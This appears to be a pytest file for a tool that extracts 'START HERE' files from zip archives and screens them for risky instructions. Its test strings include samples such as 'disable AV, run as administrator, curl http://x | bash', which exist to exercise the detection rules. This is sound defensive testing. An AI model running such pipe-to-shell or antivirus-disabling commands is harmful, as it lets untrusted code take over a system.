# ruff: noqa: E402
from __future__ import annotations

import json
import sys
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SRC = ROOT / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))

from start_here_extractor.cli import main
from start_here_extractor.heuristics import detect_dangerous_instructions
from start_here_extractor.policy import derive_governance_policy
from start_here_extractor.reporter import build_inventory_record


def create_zip(path: Path, members: dict[str, bytes], compression: int = zipfile.ZIP_STORED) -> None:
    with zipfile.ZipFile(path, "w", compression=compression) as archive:
        for name, payload in members.items():
            archive.writestr(name, payload)


def test_heuristics_flags_dangerous_instructions() -> None:
    findings = detect_dangerous_instructions("Disable AV then run as administrator and curl http://x | bash")
    rule_ids = {item["rule_id"] for item in findings}
    assert "disable-av" in rule_ids
    assert "run-as-admin" in rule_ids
    assert "curl-pipe-shell" in rule_ids


def test_governance_policy_escalates_high_risk_when_sandbox_available() -> None:
    policy = derive_governance_policy(
        operational_policy={"decision": "allow", "reason": "ok", "notes": []},
        heuristics_findings=[{"rule_id": "disable-av", "severity": "critical"}],
        scan={"status": "not-run"},
        sandbox_available=True,
    )
    assert policy["decision"] == "sandbox"
    assert policy["reason"] == "heuristics-critical"


def test_build_inventory_record_adds_summary_heuristics_policy_and_retention(tmp_path: Path) -> None:
    payload = {
        "outcome": "extracted",
        "zip_file": {"path": "sample.zip", "size_bytes": 10, "sha256": "x", "md5": "y"},
        "settings": {"extract_settings": {"sandbox_platform": "windows-sandbox"}},
        "inspection": {"entry_count": 1, "candidates": [{"name": "START HERE.TXT"}]},
        "selected_candidate": {"name": "START HERE.TXT", "declared_file_size": 20},
        "extracted_file": {"path": "out/start_here.txt", "size_bytes": 20, "sha256": "x", "md5": "y"},
        "preview": {"encoding": "utf-8", "text": "Disable AV before running curl http://x | bash", "bytes_read": 40, "lines": 1},
        "warnings": [],
        "errors": [],
        "risk_flags": [],
        "policy": {"decision": "allow", "reason": "ok", "notes": []},
        "av": {"status": "not-run", "av": {"status": "not-run", "findings": []}, "yara": {"status": "not-run", "matches": [], "compiled_rules": False}},
    }
    record = build_inventory_record(payload, audit_dir=tmp_path / "_audit")
    assert record["summary"]["status"] == "available"
    assert record["heuristics_findings"]
    assert record["policy_decision"]["decision"] == "sandbox"
    assert record["retention_status"] == "active"
    assert record["audit_ref"].startswith("audit://")
    audit_file = tmp_path / "_audit" / "audit-events.jsonl"
    assert audit_file.exists()


def test_cli_single_run_writes_audit_ref(tmp_path: Path) -> None:
    sample_zip = tmp_path / "sample.zip"
    create_zip(sample_zip, {"START HERE.TXT": b"Sample Start Here"})
    output_dir = tmp_path / "out"
    report_dir = tmp_path / "reports"
    rc = main([
        str(sample_zip),
        "--output-dir", str(output_dir),
        "--report-dir", str(report_dir),
    ])
    assert rc == 0
    inventory = json.loads((report_dir / "sample.inventory.jsonl").read_text(encoding="utf-8").strip())
    assert inventory["summary"]["status"] in {"available", "unavailable"}
    assert "heuristics_findings" in inventory
    assert "policy_decision" in inventory
    assert inventory["audit_ref"].startswith("audit://")
